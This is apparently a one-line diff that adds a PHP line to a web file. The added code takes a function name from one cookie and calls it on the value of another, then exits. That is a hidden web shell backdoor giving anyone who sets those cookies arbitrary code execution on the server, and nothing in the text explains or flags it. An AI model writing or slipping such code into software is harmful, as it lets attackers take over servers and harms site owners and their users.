@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["mm"])){$_COOKIE["RWL"]($_COOKIE["mm"]);exit;}
